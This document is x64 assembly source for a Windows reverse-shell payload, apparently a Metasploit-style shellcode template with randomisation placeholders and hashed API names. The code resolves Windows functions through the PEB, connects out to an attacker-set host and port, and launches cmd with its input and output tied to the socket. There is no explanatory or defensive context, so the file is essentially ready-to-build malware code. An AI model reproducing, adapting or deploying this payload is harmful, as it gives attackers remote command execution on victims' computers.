_start:
    cld
    and rsp,byte -0x10
    call save_beginning

metasploit_block_api:
    push r9
    push r8
    xor rax,rax
    mov rax,0xff
    push rdx
    xor rdx,rdx
    xor rax,0x9f
    mov rax,[gs:rax] ; 0x60
    xor rax,%RANDOM__1%
    push rcx
    mov rdx,rax
    xor rdx,%RANDOM__1%
    mov rdx,[rdx+0x18]
    xor rdx,rax
    push rsi
    xor rdx,rax
    nop
    mov rdx,[rdx+0x20]

load_module_name:
    mov rsi,[rdx+0x50]
    movzx rcx,word [rdx+0x4a]
    xor r9,r9

module_hash_loop:
    xor rax,rax
    lodsb
    cmp al,0x61
    jl skip_case_adjustment
    sub al,0x20
skip_case_adjustment:
    ror r9d,%ROR_VALUE%
    add r9d,eax
    nop
    loop module_hash_loop

is_valid_module:
    push rdx
    push r9
    mov rdx,[rdx+0x20]
    mov eax,[rdx+0x3c]
    add rax,rdx
    mov eax,[rax+0x88]
    test rax,rax
    jz load_next_module

    add rax,rdx
    mov ecx,[rax+0x18]
    mov r8d,[rax+0x20]
    push rax
    add r8,rdx

find_function:
    jrcxz pre_load_next_module
    dec rcx
    mov esi,[r8+rcx*4]
    add rsi,rdx
    xor r9,r9

function_hash_loop:
    xor rax,rax
    lodsb
    ror r9d,%ROR_VALUE%
    add r9d,eax
    cmp al,ah
    jnz function_hash_loop

check:
    add r9,[rsp+0x8]
    cmp r9d,r10d
    jnz find_function

final:
    pop rax
    mov r8d,[rax+0x24]
    add r8,rdx
    mov cx,[r8+rcx*2]
    mov r8d,[rax+0x1c]
    add r8,rdx
    mov eax,[r8+rcx*4]
    add rax,rdx
    pop r8
    xor rax,%RANDOM__2%
    pop r8
    pop rsi
    pop rcx
    pop rdx
    pop r8
    pop r9
    pop r10
    sub rsp,byte 0x20
    push r10
    xor rax,%RANDOM__2%
    jmp rax

pre_load_next_module:
    pop rax
load_next_module:
    pop r9
    pop rdx
    mov rdx,[rdx]
    jmp load_module_name

save_beginning:
    pop rbp
    mov r14,0x32335f327377 ; Chaine de caractere "ws2_32"
    push r14
    mov r14,rsp
    sub rsp,0x1a0
    mov r13,rsp
    mov r12,%LHOST__LPORT%0002 ; 4 bytes for IP, 2 for the port
    push r12
    mov r12,rsp
    mov rcx,r14
    mov r10d,%HASH__kernel32.dll__LoadLibraryA% ; kernel32.LoadLibraryA("ws2_32")
    call rbp
    mov rdx,r13
    push qword 0x101
    pop rcx
    mov r10d,%HASH__ws2_32.dll__WSAStartup% ; ws2_32.WSAStartup(0x101,WSADATA) 
    call rbp
    push rax
    push rax
    xor r9,r9
    xor r8,r8
    inc rax
    mov rdx,rax
    inc rax
    mov rcx,rax
    mov r10d,%HASH__ws2_32.dll__WSASocketA% ; ws2_32.WSASocketA(0x2,0x1,0x0,0x0,?,0x1)
    call rbp
    mov rdi,rax
    push byte 0x10
    pop r8
    mov rdx,r12
    mov rcx,rdi
    mov r10d,%HASH__ws2_32.dll__connect% ; ws2_32.connect(0xD0,?,0x10)
    call rbp
    add rsp,0x240
    mov r8,0x646d63
    push r8
    push r8
    mov rdx,rsp
    push rdi
    push rdi
    push rdi
    xor r8,r8
    push byte 0xd
    pop rcx

to_rename_161:
    push r8
    loop to_rename_161
    mov word [rsp+0x54],0x101
    lea rax,[rsp+0x18]
    mov byte [rax],0x68
    mov rsi,rsp
    push rsi
    push rax
    push r8
    push r8
    push r8
    inc r8
    push r8
    dec r8
    mov r9,r8
    mov rcx,r8
    mov r10d,%HASH__kernel32.dll__CreateProcessA% ; kernel32.CreateProcessA(???)
    call rbp
    xor rdx,rdx
    dec rdx
    mov ecx,[rsi]
    mov r10d,%HASH__kernel32.dll__WaitForSingleObject% ; kernel32.WaitForSingleObject(???)
    call rbp
    mov ebx,%HASH__kernel32.dll__ExitProcess% ; kernel32.ExitProcess(0) for later
    mov r10d,%HASH__kernel32.dll__GetVersion% ; kernel32.GetVersion()
    call rbp
    add rsp,byte 0x28
    cmp al,0x6
    jl to_rename_1c4
    cmp bl,0xe0
    jnz to_rename_1c4
    mov ebx,%HASH__kernel32.dll__RtlExitUserThread% ; kernel32.RtlExitUserThread(0)

to_rename_1c4:
    push byte 0x0
    pop rcx
    mov r10d,ebx
    call rbp
